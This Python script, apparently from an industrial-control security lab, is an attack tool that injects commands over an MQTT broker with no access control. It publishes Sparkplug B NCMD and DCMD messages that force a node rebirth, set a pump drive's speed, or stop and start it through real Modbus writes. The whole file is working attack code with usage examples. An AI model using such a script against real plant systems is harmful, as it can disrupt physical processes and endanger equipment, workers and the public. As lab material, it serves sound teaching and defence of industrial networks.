"""
Command injection — reach the physical process via DCMD.

We publish a Sparkplug DCMD to a writable metric. The edge node maps that
metric straight onto a Modbus write to the VFD, so this is not a dashboard
trick — it changes the actual drive: speed setpoint or run/stop.

There is no ACL, so anyone who can reach the broker can publish this.

Usage:
    python -m attacker.command --pump 101 --speed 20      # slow the pump to 20%
    python -m attacker.command --pump 101 --stop          # stop the drive
    python -m attacker.command --node-rebirth              # force a re-announce
"""

import argparse
import os
import time

import paho.mqtt.client as mqtt

from common import sparkplug as spb
from common.sparkplug import DataType as DT

GROUP = os.environ.get("SPB_GROUP", "NorthPlant")
NODE = os.environ.get("SPB_NODE", "EN-PumpHouse-01")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=os.environ.get("MQTT_HOST", "localhost"))
    ap.add_argument("--port", type=int, default=int(os.environ.get("MQTT_PORT", "1883")))
    ap.add_argument("--pump", type=int, default=101)
    ap.add_argument("--speed", type=int, help="set VFD speed setpoint 0-100 %%")
    ap.add_argument("--stop", action="store_true", help="stop the drive")
    ap.add_argument("--start", action="store_true", help="start the drive")
    ap.add_argument("--node-rebirth", action="store_true", help="force NBIRTH/DBIRTH")
    args = ap.parse_args()

    c = mqtt.Client(client_id="rogue-controller")
    c.connect(args.host, args.port, keepalive=30)
    c.loop_start()
    time.sleep(0.3)

    if args.node_rebirth:
        p = spb.new_payload(seq=0)
        spb.add_metric(p, name="Node Control/Rebirth", datatype=DT.Boolean, value=True)
        c.publish(spb.topic(GROUP, "NCMD", NODE), spb.encode(p), qos=0)
        print(f"[+] NCMD Node Control/Rebirth -> {NODE}")

    device = f"Pump-{args.pump}"
    dcmd_topic = spb.topic(GROUP, "DCMD", NODE, device)

    if args.speed is not None:
        p = spb.new_payload(seq=0)
        spb.add_metric(p, name="Setpoint/Speed", datatype=DT.Double, value=float(args.speed))
        c.publish(dcmd_topic, spb.encode(p), qos=0)
        print(f"[+] DCMD Setpoint/Speed={args.speed}%  -> {dcmd_topic}")
        print("    (watch plc-sim / edge logs: this writes the real Modbus register)")

    if args.stop or args.start:
        p = spb.new_payload(seq=0)
        spb.add_metric(p, name="Control/Run", datatype=DT.Boolean, value=bool(args.start))
        c.publish(dcmd_topic, spb.encode(p), qos=0)
        print(f"[+] DCMD Control/Run={bool(args.start)}  -> {dcmd_topic}")

    time.sleep(0.5)
    c.loop_stop()


if __name__ == "__main__":
    main()
